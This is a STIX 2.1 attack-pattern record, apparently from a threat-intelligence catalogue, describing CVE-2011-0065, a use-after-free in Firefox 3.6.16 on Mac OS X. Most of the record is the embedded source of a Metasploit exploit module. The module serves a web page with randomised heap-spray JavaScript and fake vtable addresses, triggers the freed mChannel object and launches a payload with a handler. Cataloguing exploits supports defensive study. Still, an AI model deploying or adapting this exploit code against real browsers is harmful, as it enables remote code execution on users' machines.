{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4863133b-18a4-4ba3-9d8d-93aac1333c5a",
    "created": "2024-08-14T16:34:24.459098Z",
    "modified": "2024-08-14T16:34:24.459102Z",
    "name": "Mozilla Firefox 3.6.16 mChannel Use-After-Free",
    "description": " This module exploits a use-after-free vulnerability in Mozilla Firefox 3.6.16. An OBJECT element, mChannel, can be freed via the OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel becomes a dangling pointer and can be reused when setting the OBJECTs data attribute. This module has been tested on Mac OS X 10.6.6, 10.6.7 10.6.8, 10.7.2 and 10.7.3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/mozilla_mchannel.rb",
            "external_id": "mozilla_mchannel.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0065"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=634986"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/2011/mfsa2011-13.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name => HttpClients::FF,\n  #  :ua_minver => \"3.6.16\",\n  #  :ua_maxver => \"3.6.16\",\n  #  :os_name => OperatingSystems::Match::MAC_OSX,\n  #  :javascript => true,\n  #  :rank => NormalRanking,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mozilla Firefox 3.6.16 mChannel Use-After-Free',\n      'Description'    => %q{\n        This module exploits a use-after-free vulnerability in Mozilla\n        Firefox 3.6.16. An OBJECT element, mChannel, can be freed via the\n        OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel\n        becomes a dangling pointer and can be reused when setting the OBJECTs\n        data attribute. This module has been tested on Mac OS X 10.6.6, 10.6.7,\n        10.6.8, 10.7.2 and 10.7.3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'regenrecht',                       # discovery\n          'Rh0',                              # windows metasploit module\n          'argp <argp[at]census-labs.com>'    # mac os x version\n        ],\n      'References'     =>\n        [\n          ['CVE',    '2011-0065'],\n          ['OSVDB',  '72085'],\n          ['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=634986'],\n          ['URL',    'http://www.mozilla.org/security/announce/2011/mfsa2011-13.html']\n        ],\n      'Payload'        =>\n        {\n          'Space' => 1024,\n        },\n      'Platform'       => 'osx',\n      'Targets'        =>\n        [\n          [\n            # Firefox 3.6.16 on Lion runs as a 32-bit process\n            'Firefox 3.6.16 on Mac OS X (10.6.6, 10.6.7, 10.6.8, 10.7.2 and 10.7.3)',\n            {\n              'Arch' => ARCH_X86,\n              'Fakevtable' => 0x2727,\n              'Fakefunc' => 0x2727001c,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-05-10'\n    ))\n  end\n\n  def on_request_uri(cli, request)\n    # random javascript variable names\n    js_element_name      = rand_text_alpha(rand(10) + 5)\n    js_obj_addr_name     = rand_text_alpha(rand(10) + 5)\n    js_sc_name           = rand_text_alpha(rand(10) + 5)\n    js_ret_addr_name     = rand_text_alpha(rand(10) + 5)\n    js_chunk_name        = rand_text_alpha(rand(10) + 5)\n    js_final_chunk_name  = rand_text_alpha(rand(10) + 5)\n    js_block_name        = rand_text_alpha(rand(10) + 5)\n    js_array_name        = rand_text_alpha(rand(10) + 5)\n\n    # check for non vulnerable targets\n    agent = request.headers['User-Agent']\n\n    if agent !~ /Intel Mac OS X 10\\.6/ or agent !~ /Intel Mac OS X 10\\.7/ and agent !~ /Firefox\\/3\\.6\\.16/\n      vprint_error(\"Target not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    # re-generate the payload\n    return if ((payload = regenerate_payload(cli).encoded) == nil)\n\n    payload_buf  = ''\n    payload_buf << payload\n    escaped_payload = Rex::Text.to_unescape(payload_buf)\n\n    # setup the fake memory references\n    my_target = targets[0] # in case we add more targets later\n    fakevtable = Rex::Text.to_unescape([my_target['Fakevtable']].pack('v'))\n    fakefunc = Rex::Text.to_unescape([my_target['Fakefunc']].pack('V*'))\n\n    exploit_js = <<-JS\n    #{js_element_name} = document.getElementById(\"d\");\n    #{js_element_name}.QueryInterface(Components.interfaces.nsIChannelEventSink);\n    #{js_element_name}.onChannelRedirect(null, new Object, 0)\n\n    #{js_obj_addr_name} = unescape(\"\\x00#{fakevtable}\");\n\n    var #{js_sc_name} = unescape(\"#{escaped_payload}\");\n\n    var #{js_ret_addr_name} = unescape(\"#{fakefunc}\");\n\n    while(#{js_ret_addr_name}.length < 0x120)\n    {\n      #{js_ret_addr_name} += #{js_ret_addr_name};\n    }\n\n    var #{js_chunk_name} = #{js_ret_addr_name}.substring(0, 0x18);\n    #{js_chunk_name} += #{js_sc_name};\n    #{js_chunk_name} += #{js_ret_addr_name};\n    var #{js_final_chunk_name} = #{js_chunk_name}.substring(0, 0x10000 / 2);\n\n    while(#{js_final_chunk_name}.length < 0x800000)\n    {\n      #{js_final_chunk_name} += #{js_final_chunk_name};\n    }\n\n    var #{js_block_name} = #{js_final_chunk_name}.substring(0, 0x80000 - #{js_sc_name}.length - 0x24 / 2 - 0x4 / 2 - 0x2 / 2);\n\n    #{js_array_name} = new Array()\n\n    for(n = 0; n < 0x220; n++)\n    {\n      #{js_array_name}[n] = #{js_block_name} + #{js_sc_name};\n    }\n    JS\n\n    html = <<-HTML\n    <html>\n    <body>\n      <object id=\"d\"><object>\n      <script type=\"text/javascript\">\n      #{exploit_js}\n      </script>\n    </body>\n    </html>\n    HTML\n\n    # remove the extra tabs\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, html, { 'Content-Type' => 'text/html' })\n\n    # handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-10",
    "x_mitre_platforms": [
        "osx'"
    ]
}